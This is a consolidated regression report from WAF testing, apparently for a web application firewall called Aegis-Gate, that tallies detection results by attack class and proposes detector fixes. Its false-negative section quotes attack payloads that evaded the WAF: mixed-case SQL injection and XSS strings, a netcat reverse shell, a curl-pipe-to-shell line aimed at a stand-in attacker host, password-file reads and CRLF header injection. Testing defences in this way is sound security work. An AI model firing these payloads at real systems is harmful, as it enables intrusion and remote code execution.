# Aegis-Gate — Round-2 Regression: Consolidated Report

**Date:** 2026-06-13   ·   **WAF:** `http://localhost:8080` (data plane) → **local mock upstream** `:9999`
**Config under test:** all detectors enabled; cumulative IP-risk thresholds disabled.
**Suite:** 1,159 cases / 14 classes (1,037 attack · 122 benign) — see `../README.md`, `recon/RECON-SUMMARY.md`.

Two independent harnesses were used:
- **Python runner** (`run_all.py`, raw sockets) — **full run, 1,159 cases.** Faithful: sets `Host`/`Origin`/`Cookie`/`Upgrade`, drives real WS frames, sends CRLF/smuggling. **This is the authoritative run.**
- **Claude-in-Chrome** (in-page `fetch`) — partial (≈145 cases: full SQLi class + a 35-case cross-class probe). Used to **cross-validate** the Python results because it runs slower, from a browser fingerprint, and exposes state effects.

Verdict signal: this WAF emits **no `X-Aegis-Decision`** header on these responses, so verdict = HTTP status (`403/413→block`, `429→challenge`, `200/401/404→allow`).

---

## 1. Executive summary

| | |
|---|---|
| Total executed | 1,049 (110 skipped: DoS-patterns + informational SSE/WS frames) |
| Pass | 852 |
| **False negatives (attacks allowed)** | **95** |
| **False positives (benign blocked)** | **102** |
| Errors | 0 |
| Raw detection rate | 81.2% |

**The two error numbers must be read differently:**

- **The 95 false-negatives are real content-detector gaps**, and they cluster into one dominant pattern: **case-sensitive matching**. Mixed-case payloads (`UnIoN SeLeCt`, `oR 1=1`, `<ScRiPt>`) walk straight through SQLi and XSS. This is the highest-value, lowest-effort fix.
- **The 102 false-positives are largely an artifact**, not content-rule misfires. Benign paths that are blocked here (`/game/list`, `/`, `/static/js/app.js`) returned **200** in the slower Chrome run. The likely cause is a **stateful per-IP detector** (recon/behavior/velocity — *not* the cumulative-IP-risk knob you disabled) that trips after a burst of varied traffic and then blanket-blocks. **Do not treat 102 as a real FP count until it's re-measured in isolation** (instructions in §5).

> **Methodology caveat that cuts both ways:** the same per-IP state that inflates FPs also inflates *attack detection* for classes that run later in the alphabetical sweep. Early classes give clean content signal; late classes get "free" blocks from reputation. So per-class detection rates below are **directional**, and the true content-detection gaps are best read from the early classes + the Chrome clean run. Isolated per-class re-runs (§5) are needed for trustworthy per-class numbers.

---

## 2. Results by class (Python full run)

| Class | Total | Pass | FP | FN | Skip | Detect% | Read with care |
|---|--:|--:|--:|--:|--:|--:|---|
| auth-jwt | 61 | 58 | 3 | 0 | 0 | 95 | runs **first** (clean state) — see §4.3 |
| benign-baseline | 99 | 20 | **79** | 0 | 0 | 20 | FP almost certainly state-inflated (§3) |
| caching | 33 | 19 | 14 | 0 | 0 | 58 | FP = benign assets, likely state-inflated |
| cors | 24 | 21 | 3 | 0 | 0 | 88 | 3 benign preflights blocked — verify |
| injection-cmdi | 76 | 67 | 0 | **9** | 0 | 88 | real gaps: `|`,`&`,`;` operators + `%00` |
| injection-nosql | 48 | 48 | 0 | 0 | 0 | 100 | strong |
| injection-sqli | 110 | 78 | 0 | **32** | 0 | 71 | **case-sensitivity + signature gaps** |
| path-traversal | 51 | 51 | 0 | 0 | 0 | 100 | ⚠ Chrome saw `%2e%2e` slip — likely state-masked |
| protocol | 37 | 36 | 0 | 1 | 0 | 97 | 1 TE.CL smuggling case slipped |
| rate-limit | 94 | 6 | 0 | 0 | 88 | 100 | 88 DoS-patterns are informational skips |
| sse | 92 | 25 | 1 | **44** | 22 | 36 | CRLF-in-path + cross-origin SSE not blocked |
| ssrf | 32 | 32 | 0 | 0 | 0 | 100 | strong |
| websocket | 322 | 320 | 2 | 0 | 0 | 99 | strong handshake coverage; 2 benign FPs |
| xss | 80 | 71 | 0 | **9** | 0 | 89 | case-sensitivity gap |

---

## 3. False negatives — the real gaps (priority order)

### 3.1 ⭐ Case-sensitive signature matching — SQLi + XSS (~24 cases)
The evasion rollup is unambiguous: **24 mixed-case** + **22 raw** + **4 nullbyte-suffix**. The detectors are matching keywords/tags case-sensitively, so simple case alternation defeats them:

- SQLi: `1' UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS--`, `oR 1=1--`, `pg_SlEeP(5)`, `wAiTfOr dElAy`, `1=CoNvErT(int,@@version)`, `OrDeR By 8`, `ExTrAcTvAlUe(...)` — all **allowed**.
- XSS: `<ImG SrC=X OnErRoR=AlErT(1)>`, `<ScRiPt>`, `<IfRaMe sRc=jAvAsCrIpT:...>`, `<DeTaIlS OnToGgLe>`, `<MaRqUeE OnStArT>`, `<ViDeO><sOuRcE OnErRoR>` — all **allowed**.

**Fix:** lowercase (case-fold) the inspected value before signature/regex matching, or compile patterns case-insensitive. Single highest-impact change.

### 3.2 SQLi signature coverage gaps (raw payloads, ~10 cases)
Even without case tricks, several canonical forms slip: `' OR '1'='1`, `') Or ('1'='1`, `' UNION ALL SELECT NULL,NULL,NULL--`, `' AND SLEEP(5)--`, `'; DROP TABLE transactions;--`, `' OR pg_sleep(5)--`, `' OR 'x'='x' AND email IS NOT NULL--`. The signature set is missing the basic boolean-tautology and several time-based/stacked forms.

**Fix:** broaden the SQLi signature set (tautology `OR '1'='1`, `UNION ALL SELECT`, `SLEEP`/`pg_sleep`/`WAITFOR`, stacked `;DROP`).

### 3.3 Command-injection operator gaps (9 cases)
`| id`, `& whoami`, `&& cat /etc/passwd`, `; cat /etc/passwd`, `| nc 10.0.0.1 4444 -e /bin/sh`, `; curl http://attacker.evil.com/x | sh`, `; ping -c 10 127.0.0.1`, `|| sleep 5`, `; python -c '...'` — in the `name` query param and `feedback` body. Several carry a `%00` suffix.

**Fix:** detect shell metacharacters `| & ; $( ) \` && ||` in query/body values; decode/normalize `%00` (nullbyte) before inspection (it currently evades — 4 cases).

### 3.4 SSE: CRLF-in-path + cross-origin/unauth (44 cases)
- **CRLF / header injection in the request target** (`/api/notifications/stream%0d%0aX-Injected: evil`, and literal `\r\n`/newline variants) — 22 cases **allowed**. The WAF isn't rejecting CRLF in the path/target. (Same class of issue likely applies to any endpoint, not just SSE.)
- **Cross-origin / unauthenticated SSE** (foreign `Origin`, no cookie) — 22 cases allowed. *Partly expectation-dependent:* a WAF may legitimately pass these and rely on the app's CORS/auth. Worth a policy decision rather than an automatic "gap."

**Fix:** block CRLF (`%0d`/`%0a`/raw) in request targets globally; decide whether SSE origin/auth is enforced at the WAF or the app.

### 3.5 Protocol (1 case)
`protocol-0002` — a TE.CL request-smuggling variant on `/api/feedback` slipped. Low volume, but smuggling is high-impact; worth confirming the WAF rejects conflicting `Content-Length`/`Transfer-Encoding`.

---

## 4. False positives — read with suspicion

### 4.1 Why the 102 is almost certainly inflated
The blocked-benign list includes `/game/list`, `/`, `/about`, `/health`, `/static/js/app.js`, `/favicon.ico` — ordinary public reads. **In the Chrome run those exact paths returned 200.** Nothing about their content should trip a content rule. The differentiator is **request volume/pattern from one source**: the Python runner fires 1,159 requests back-to-back, and a stateful recon/behavior/velocity detector appears to flip the source IP into a block posture mid-run, sweeping up benign traffic.

Corroborating evidence of state contamination:
- `benign-baseline` runs **2nd** (after 61 jwt requests) and is already heavily blocked.
- Hex-encoded SQLi (`0x27...`) was a **false-negative in Chrome** (clean) but **caught in Python** (contaminated) — i.e., later requests get blocked by reputation, not content.
- `path-traversal` shows 100% in Python but Chrome saw `%2e%2e` **slip** — the content gap is masked by state.

### 4.2 The FPs that may be real (verify in isolation)
A few benign blocks touch round-2 surfaces and would cost legit-traffic points if confirmed:
- **`websocket-0001/0002`** — benign authenticated WS handshake + subscribe blocked. A real FP here means legitimate live clients can't connect.
- **`cors-0001/0002/0003`** — benign partner CORS preflights blocked.
- **`sse-0001`** — benign SSE stream open blocked.
- **`jwt-0059/0060/0061`** — structurally valid `Bearer` tokens on `/api/public/stats` blocked (see §4.3).

### 4.3 JWT: validation or blanket blocking?
`auth-jwt` runs first (clean state) and shows **0 FN / 3 FP** — every forged/expired/alg-none token blocked, *and* every benign well-formed token blocked. That pattern is most consistent with the WAF **blocking on the mere presence of an `Authorization: Bearer` header** rather than validating the token. (The Chrome single-probe of an *expired* token returned 200, which slightly conflicts — worth a targeted re-test.) Since the real NovaBet app is **cookie-only and never sends Bearer**, blanket-blocking Bearer is defensible and the 3 "FPs" are synthetic/low-priority — but if you intend the JWT detector to actually *validate* (`exp`, `alg`, signature), this run does not yet prove it does.

---

## 5. Next steps (in order)

### Step 1 — Get clean, uncontaminated numbers (do this first)
Re-measure each class in isolation with a state reset between classes, so cross-class reputation can't bleed in. One-liner:

```sh
cd <repo>/tests/n-tester/r2-regression
for c in $(ls cases); do
  [ -d "cases/$c" ] || continue
  python3 run_all.py --reset --delay 0.03 "$c"
done
```

Or just the suspect classes:
```sh
python3 run_all.py --reset --delay 0.05 benign-baseline caching cors websocket sse auth-jwt
```

Expected outcome: most of the 102 FPs disappear (confirming state-inflation), and late classes (`path-traversal`, `sse`, `xss`) reveal their **true** content gaps that were masked by reputation blocking. Compare the isolated FN totals to this run — the delta is the "reputation assist."

### Step 2 — Fix the content detectors (highest ROI first)
1. **Case-insensitive matching** for SQLi + XSS signatures (case-fold before match). Recovers ~24 misses immediately.
2. **Normalize before inspafting:** URL-decode once more for `%00` (nullbyte) and `%2e%2e`; reject/strip CRLF (`%0d`/`%0a`/raw) in request targets.
3. **Broaden signatures:** SQLi tautology/`UNION ALL`/`SLEEP`/`WAITFOR`/stacked `;DROP`; CMDi shell metacharacters `| & ; && || $( ) \``.
4. **Confirm smuggling rejection:** conflicting `Content-Length` + `Transfer-Encoding` → block.

### Step 3 — Decide policy on the debatable items
- JWT: validate (`exp`/`alg`/sig) vs. blanket-block Bearer — pick one and make the benign-token expectation match.
- SSE/WS cross-origin & auth: enforce at WAF or delegate to app? Update the test expectations accordingly.

### Step 4 — Re-run the full suite and track the delta
After fixes, run `python3 run_all.py --reset` again and diff against this report. Target: FN→single digits (case-fold alone should roughly halve them), FP→near-zero on the isolated benign run.

### Step 5 — Keep the upstream as the local mock
Do **not** repoint the WAF upstream at the committee server for these runs. The 95 unblocked attacks would execute against their live infrastructure (reverse shells, metadata SSRF, time-based SQL load, burst traffic) — that's real exploitation/DoS against a third party and against the round-1 guardrail. The WAF's verdict doesn't depend on what's behind it, so the mock is the correct target.

---

## 6. What's working well (don't regress these)
- **NoSQLi, SSRF, path-traversal (content), and WebSocket handshake abuse** — strong block rates. The WAF reliably rejects `$ne`/`$gt` operator injection, metadata/loopback SSRF, and cross-site/tampered WS upgrades (CSWSH, missing-origin, host-header SSRF, upgrade-on-protected-path).
- **Round-1 regression** (`.env`, phpunit RCE, cgi-bin traversal) — still blocked.

## Appendix — artifacts
- This run: `reports/run-20260613-131631.{jsonl,summary.json,md}`
- Chrome partial run: `reports/live-chrome-report.md`
- Recon & log analysis: `recon/RECON-SUMMARY.md`
- Suite + runners: `cases/`, `run_all.py` (python, zero-dep), `run.sh` (bash), `README.md`
